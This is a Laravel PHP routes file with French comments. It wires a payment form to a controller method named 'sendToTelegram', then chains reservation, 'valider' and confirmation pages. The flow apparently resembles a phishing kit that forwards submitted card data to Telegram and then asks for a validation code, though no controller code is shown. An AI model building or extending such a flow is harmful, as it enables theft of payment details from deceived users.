<?php

use App\Http\Controllers\PaymentController;
use App\Http\Controllers\ReservationController;
use App\Http\Controllers\ValiderController;
use Illuminate\Support\Facades\Route;

// Page d'accueil
Route::get('/', function () {
    return view('welcome');
});

// Traitement du premier formulaire
Route::post('/send-payment', [PaymentController::class, 'sendToTelegram'])
    ->name('payment.send');

// Page d'informations personnelles - DISABLED
// Route::get('/personal-info', function () {
//     return view('personal-info');
// })->name('personal-info');

// Traitement du formulaire d'informations personnelles - DISABLED
// Route::post('/personal-info', [PaymentController::class, 'storePersonalInfo'])
//     ->name('personal-info.submit');
////////////////////////////////////////////////////////////////////////
// Affichage de la page réservation
Route::get('/reservation', function () {
    return view('reservation');
})->name('reservation');

// Traitement du formulaire de réservation
Route::post('/reservation', [ReservationController::class, 'submit'])
    ->name('reservation.submit');
///////////////////////////////////////////////////////////////////////////

// Affichage de la page valider
Route::get('/valider', function () {
    return view('valider');
})->name('valider');


// Traitement du formulaire valider
Route::post('/valider', [ValiderController::class, 'submit'])
    ->name('valider.submit');

///////////////////////////////////////////////////////////////////////////////////////////

// Page de confirmation
Route::get('/confirmation', function () {
    return view('success');
})->name('success');